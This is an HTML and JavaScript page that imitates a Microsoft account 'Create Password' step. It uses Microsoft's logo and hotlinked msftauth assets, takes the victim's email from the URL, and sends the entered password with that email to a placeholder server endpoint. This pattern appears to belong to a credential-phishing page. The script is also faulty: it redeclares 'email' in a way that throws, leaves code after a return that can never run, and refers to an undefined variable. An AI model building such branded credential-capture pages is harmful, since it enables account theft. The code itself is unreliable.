<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="icon" type="image" href="images/fav.ico">
   <link rel="stylesheet" href="./createpwd.css">
</head>
<body>
    <div class="login-container"><img id="logo"src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="logo">
        <br>
        <br>
        <img src="https://acctcdn.msftauth.net/images/Arrows/left_qcwoJO81F7bEFg3Pj_fUEA2.svg"> <span id="displayEmail"></span>
        <h2 id="createpwd"> Create Password </h2>
        
        <h3>Enter the password you would like to use with your account</h3>
        <span id="password-error" class="error"></span>
       
       
        <form action=""name="form1"method="post"onsubmit="return validate()"novalidate id="password-form">
           
        <input type="password" id="password" name="password" placeholder="Create password" class="password-input"required >
       
        <input type="checkbox" id="showPasswordCheckbox">
        <label for="showPasswordCheckbox">Show Password</label>
            <button id="next" type="submit">Next</button>
        </form>


       
            
            
           
      </div>
   
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
      



 <script>
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');

    showPasswordCheckbox.addEventListener('change', () => {
      passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      
    });
    console.log("Loaded: " + window.location.href);

    // Get the email parameter from the URL
const urlParams = new URLSearchParams(window.location.search);
const email = urlParams.get('email');

// Display the email on the page
document.getElementById('displayEmail').textContent = email;



       
        const passwordError = document.getElementById('password-error');
       

        

        function validate() {
            const password = passwordInput.value;
            const passwordPattern = /^(?=.*\d)(?=.*[A-Z])(?=.*[!@#$%^&*]).{8,}$/;

            if (!passwordPattern.test(password)) {
                passwordError.textContent = "Password must meet the criteria: at least 8 characters, one digit, one uppercase letter, and one special character (!@#$%^&*).";
                passwordInput.focus();
                return false;
            }

            return true; 
            // Form submission allowed
            console.log("Email value: " + hiddenInput.value);
   
            window.location.href = 'firstname.html?email=' + encodeURIComponent(email.value);
        }
   






        



const passwordForm = document.getElementById('password-form');

passwordForm.addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission

    // Validate the password
    if (validate()) {
        const password = passwordInput.value;
        const email = email; // You already have the email value from the URL

        // Create a data object to send to the server
        const data = {
            email: email,
            password: password,
        };

        // Make an AJAX request to save the password on the server
        // Replace 'your-server-endpoint' with your actual server endpoint
        fetch('your-server-endpoint', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
            .then((response) => response.json())
            .then((result) => {
                if (result.success) {
                    // Password saved successfully, redirect to firstname.html
                    window.location.href = 'firstname.html?email=' + encodeURIComponent(email);
                } else {
                    passwordError.textContent = 'Error saving the password. Please try again later.';
                }
            })
            .catch((error) => {
                passwordError.textContent = 'Error saving the password. Please try again later.';
            });
    }
});



 </script>


     
    
</body>
</html>